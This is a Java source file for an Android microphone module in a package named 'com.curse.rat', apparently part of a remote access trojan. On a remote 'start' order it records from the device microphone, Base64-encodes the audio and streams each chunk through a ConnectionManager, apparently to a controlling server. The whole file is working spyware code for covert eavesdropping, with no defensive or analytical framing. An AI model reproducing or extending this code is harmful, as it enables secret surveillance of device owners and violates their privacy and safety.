package com.curse.rat;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;

public class MicManager {
    private static final String TAG = "MicManager";
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    
    private static AudioRecord audioRecord;
    private static boolean isStreaming = false;
    private static Thread recordingThread;
    private static int currentSampleRate = 11025;

    public static void handle(JSONObject jo) {
        try {
            String action = jo.optString("action", "start");
            if (action.equals("start")) {
                currentSampleRate = jo.optInt("sample_rate", 11025);
                startStreaming();
            } else if (action.equals("stop")) {
                stopStreaming();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling mic order: " + e.getMessage());
        }
    }

    private static synchronized void startStreaming() {
        if (isStreaming) return;
        
        int bufferSize = AudioRecord.getMinBufferSize(currentSampleRate, CHANNEL_CONFIG, AUDIO_FORMAT);
        if (bufferSize == AudioRecord.ERROR_BAD_VALUE) {
            Log.e(TAG, "Invalid audio parameters: " + currentSampleRate + "Hz");
            return;
        }

        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                currentSampleRate,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed at " + currentSampleRate + "Hz");
                return;
            }

            audioRecord.startRecording();
            isStreaming = true;

            recordingThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] buffer = new byte[2048];
                    while (isStreaming) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            try {
                                String encoded = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                                JSONObject msg = new JSONObject();
                                msg.put("type", "mic_chunk");
                                msg.put("data", encoded);
                                ConnectionManager.send(msg.toString());
                            } catch (Exception e) {
                                Log.e(TAG, "Error sending mic chunk: " + e.getMessage());
                            }
                        }
                    }
                }
            }, "MicStreamingThread");
            recordingThread.start();
            Log.d(TAG, "Microphone streaming started at " + currentSampleRate + "Hz");

        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for RECORD_AUDIO: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting microphone: " + e.getMessage());
        }
    }

    public static synchronized void stopStreaming() {
        isStreaming = false;
        if (audioRecord != null) {
            try {
                if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.stop();
                }
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audioRecord: " + e.getMessage());
            }
            audioRecord = null;
        }
        recordingThread = null;
        Log.d(TAG, "Microphone streaming stopped");
    }
}
